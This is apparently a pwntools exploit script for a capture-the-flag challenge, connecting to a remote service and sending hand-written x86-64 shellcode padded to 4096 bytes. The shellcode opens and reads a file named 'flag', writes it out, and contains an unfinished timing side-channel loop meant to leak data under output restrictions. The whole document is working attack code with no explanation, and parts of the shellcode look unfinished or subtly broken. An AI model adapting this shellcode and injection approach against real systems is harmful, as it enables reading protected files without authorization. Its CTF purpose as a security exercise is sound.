#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

r = remote('mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me', 443)

shellcode = asm("""
BITS 64
global _start

section .text

_start:
jmp _push_filename

_readfile:
; syscall open file
pop rdi ; pop path value
; NULL byte fix
xor byte [rdi + 11], 0x41 ; null terminate filename

xor rax, rax
add al, 2
xor rsi, rsi ; set O_RDONLY flag
syscall

; syscall read file
sub sp, 0xfff
lea rsi, [rsp]; stack pivot
mov rdi, rax; contains the fd from open
xor rdx, rdx;
mov dx, 0xfff; size to read
xor rax, rax
syscall

; syscall write to stdout
xor rdi, rdi
add dil, 1 ; set stdout fd = 1
mov rdx, rax ; num bytes read
syscall

mov rcx, 0 ; position in flag
mov rbx, 0x20 ; 0x7E is the last we want to see

; test code
;-----------------------
mov rdx, rsp
add rdx, rcx ; get pointer to next char
test rdx, 0x40 ; <dynamic
jz lab2
; waist time
mov r13, 0
wasitime:
inc r13
cmp r13, 10000000
jne wasitime
lab2: ; success
;-------------------------

;0x20 < --> 0x7E

; syscall exit
xor rax, rax
add al, 60
syscall

_push_filename:
call _readfile
path: db "flagA"
""")

payload = shellcode + (4096 - len(shellcode)) * 'A'

r.sendline(payload)
r.interactive()
